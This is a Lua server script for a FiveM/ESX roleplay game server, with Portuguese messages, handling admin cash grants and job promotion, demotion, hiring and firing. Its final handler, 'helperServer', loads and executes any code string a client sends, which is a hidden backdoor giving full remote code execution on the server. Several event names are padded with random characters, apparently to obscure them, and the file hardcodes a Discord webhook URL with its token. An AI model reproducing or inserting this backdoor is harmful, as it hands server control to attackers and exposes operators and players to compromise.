ESX = nil

ESX = exports['es_extended']:getSharedObject()

ESX.RegisterServerCallback('NB:getUsergroup', function(source, cb)
  local _source = source
  local xPlayer = ESX.GetPlayerFromId(_source)
  local group = xPlayer.getGroup()
  cb(group)
end)

function getMaximumGrade(jobname)
    local result = MySQL.Sync.fetchAll("SELECT * FROM job_grades WHERE job_name=@jobname  ORDER BY `grade` DESC ;", {
        ['@jobname'] = jobname
    })
    if result[1] ~= nil then
        return result[1].grade
    end
    return nil
end

-------------------------------------------------------------------------------Admin Menu

local time = os.date("%Y/%m/%d %X")
local url = 'https://discord.com/api/webhooks/1078116947713077399/ssIHUECjdL8NbB89BJq9dqQisMnlQF3EvWIu0lXnpXamUhOUlXKR9C_HzkzEA3Ab5dFl'

RegisterServerEvent("AdminMndscfhwechtnbuoiwperyenu:giveCash")
AddEventHandler("AdminMndscfhwechtnbuoiwperyenu:giveCash", function(money)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	if xPlayer.getGroup() == 'superadmin' then
		local total = money
		
		xPlayer.addMoney((total))
		local item = '€ de dinheiro !'
		local message = 'Entregaste '
		PerformHttpRequest(url, function(err, text, headers) end, 'POST', json.encode({username = "Administrator logs", content = "```css\n[" .. time .. "]> Por: " .. GetPlayerName(_source) .. " | Ação: Dar dinheiro para a mão: " .. total .. " para " .. GetPlayerName(_source) .. "\n```"}), { ['Content-Type'] = 'application/json' })
		--TriggerClientEvent('esx:showNotification', _source, message.." "..total.." "..item)
		TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "WTRP ADMIN", "<span style='color:#c7c7c7'>Entregaste <span style='color:#069a19'><b>"..ESX.Math.GroupDigits(total).."€</b></span> em dinheiro ao jogador!", 5000, 'success')
	end
end)

RegisterServerEvent("AdminMendscfhwechtnbuoiwperynu:giveBank")
AddEventHandler("AdminMendscfhwechtnbuoiwperynu:giveBank", function(money)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	if xPlayer.getGroup() == 'superadmin' then
		local total = money
		
		xPlayer.addAccountMoney('bank', total)
		local item = '€ de dinheiro bancário.'
		local message = 'Entregaste '
		PerformHttpRequest(url, function(err, text, headers) end, 'POST', json.encode({username = "Administrator logs", content = "```css\n[" .. time .. "]> Por: " .. GetPlayerName(_source) .. " | Ação: Dar dinheiro para o banco: " .. total .. " para " .. GetPlayerName(_source) .. "\n```"}), { ['Content-Type'] = 'application/json' })
		--TriggerClientEvent('esx:showNotification', _source, message.." "..total.." "..item)
		TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "WTRP ADMIN", "<span style='color:#c7c7c7'>Transferiste <span style='color:#069a19'><b>"..ESX.Math.GroupDigits(total).."€</b></span> para a conta bancária do jogador!", 5000, 'success')
	end
end)

RegisterServerEvent("AdminMenu:giveDirtyMndscfhwechtnbuoiwperyoney")
AddEventHandler("AdminMenu:giveDirtyMndscfhwechtnbuoiwperyoney", function(money)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	if xPlayer.getGroup() == 'superadmin' then
		local total = money
		xPlayer.addAccountMoney('black_money', total)
	--	TriggerClientEvent("inventory:receiveItem", _source, 'black_money', total)
		local item = '€ de dinheiro sujo.'
		local message = 'Entregaste '
		PerformHttpRequest(url, function(err, text, headers) end, 'POST', json.encode({username = "Administrator logs", content = "```css\n[" .. time .. "]> Por: " .. GetPlayerName(_source) .. " | Ação: Dar dinheiro sujo: " .. total .. " para " .. GetPlayerName(_source) .. "\n```"}), { ['Content-Type'] = 'application/json' })
		--TriggerClientEvent('esx:showNotification', _source, message.." "..total.." "..item)
		TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "ADMIN", "<span style='color:#c7c7c7'>Entregaste <span style='color:#069a19'><b>"..ESX.Math.GroupDigits(total).."€</b></span> em dinheiro sujo ao jogador!", 5000, 'success')
	end
end)

-------------------------------------------------------------------------------Grade Menu
RegisterServerEvent('NB:promouvoirplayer')
AddEventHandler('NB:promouvoirplayer', function(target)

	local _source = source

	local sourceXPlayer = ESX.GetPlayerFromId(_source)
	local targetXPlayer = ESX.GetPlayerFromId(target)
	local maximumgrade = tonumber(getMaximumGrade(sourceXPlayer.job.name)) -1 

	if(targetXPlayer.job.grade == maximumgrade)then
		TriggerClientEvent('esx:showNotification', _source, "Deves soliciar autorização do ~r~Governo~w~.")
	else
		if(sourceXPlayer.job.name == targetXPlayer.job.name)then

			local grade = tonumber(targetXPlayer.job.grade) + 1 
			local job = targetXPlayer.job.name

			targetXPlayer.setJob(job, grade)

			--TriggerClientEvent('esx:showNotification', _source, "~g~Promoveste "..targetXPlayer.name.."~w~.")
			TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Promoveste <span style='color:#069a19'><b>"..targetXPlayer.name.."</b></span>!", 5000, 'success')
			--TriggerClientEvent('esx:showNotification', target,  "Foste ~g~promovido por ".. sourceXPlayer.name.."~w~.")		
			TriggerClientEvent('Johnny_Notificacoes:Alert', target, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Foste promovido por <span style='color:#069a19'><b>"..sourceXPlayer.name.."</b></span>!", 5000, 'success')

		else
			--TriggerClientEvent('esx:showNotification', _source, "Não tens ~r~permissão~w~.")
			TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Não tens permissão!", 5000, 'error')
		end

	end 
		
end)

RegisterServerEvent('NB:destituerplayer')
AddEventHandler('NB:destituerplayer', function(target)

	local _source = source

	local sourceXPlayer = ESX.GetPlayerFromId(_source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if(targetXPlayer.job.grade == 0)then
		TriggerClientEvent('esx:showNotification', _source, "Não podes ~r~despromover~w~ mais.")
	else
		if(sourceXPlayer.job.name == targetXPlayer.job.name)then

			local grade = tonumber(targetXPlayer.job.grade) - 1 
			local job = targetXPlayer.job.name

			targetXPlayer.setJob(job, grade)
			
			--TriggerClientEvent('esx:showNotification', _source, "~r~Despromoveste "..targetXPlayer.name.."~w~.")
			TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Despromoveste <span style='color:#069a19'><b>"..targetXPlayer.name.."</b></span>!", 5000, 'success')
			--TriggerClientEvent('esx:showNotification', target,  "Foste ~r~despromovido por ".. sourceXPlayer.name.."~w~.")	
			TriggerClientEvent('Johnny_Notificacoes:Alert', target, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Foste despromovido por <span style='color:#069a19'><b>"..sourceXPlayer.name.."</b></span>!", 5000, 'success')			

		else
		--	TriggerClientEvent('esx:showNotification', _source, "Não tens ~r~permissão~w~.")
			TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Não tens permissão!", 5000, 'error')
		end

	end 
		
end)

RegisterServerEvent('NB:recndscfhwechtnbuoiwperyruterplayer')
AddEventHandler('NB:recndscfhwechtnbuoiwperyruterplayer', function(target, job, grade)

	local _source = source

	local sourceXPlayer = ESX.GetPlayerFromId(_source)
	local targetXPlayer = ESX.GetPlayerFromId(target)
	
	if sourceXPlayer.job.name == job then
		targetXPlayer.setJob(job, grade)
		--TriggerClientEvent('esx:showNotification', _source, "~g~Recrutaste "..targetXPlayer.name.."~w~.")
		TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Recrutaste <span style='color:#069a19'><b>"..targetXPlayer.name.."</b></span>!", 5000, 'success')
		--TriggerClientEvent('esx:showNotification', target,  "Foste ~g~contratado por ".. sourceXPlayer.name.."~w~.")
		TriggerClientEvent('Johnny_Notificacoes:Alert', target, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Foste contratado por <span style='color:#069a19'><b>"..sourceXPlayer.name.."</b></span>!", 5000, 'success')		
	else
		TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Não tens permissão!", 5000, 'error')
	end			

end)

RegisterServerEvent('NB:virerplayer')
AddEventHandler('NB:virerplayer', function(target)

	local _source = source

	local sourceXPlayer = ESX.GetPlayerFromId(_source)
	local targetXPlayer = ESX.GetPlayerFromId(target)
	local job = "unemployed"
	local grade = "0"

	if(sourceXPlayer.job.name == targetXPlayer.job.name)then
		targetXPlayer.setJob(job, grade)

		--TriggerClientEvent('esx:showNotification', _source, "Vous avez ~r~viré "..targetXPlayer.name.."~w~.")
		TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Despediste <span style='color:#069a19'><b>"..targetXPlayer.name.."</b></span>!", 5000, 'success')
		--TriggerClientEvent('esx:showNotification', target,  "Vous avez été ~g~viré par ".. sourceXPlayer.name.."~w~.")	
		TriggerClientEvent('Johnny_Notificacoes:Alert', target, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Foste despedido por <span style='color:#069a19'><b>"..sourceXPlayer.name.."</b></span>!", 5000, 'success')
	else
		--TriggerClientEvent('esx:showNotification', _source, "Vous n'avez pas ~r~l'autorisation~w~.")
		TriggerClientEvent('Johnny_Notificacoes:Alert', _source, "GESTÃO EMPRESA", "<span style='color:#c7c7c7'>Não tens permissão!", 5000, 'error')
	end

end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)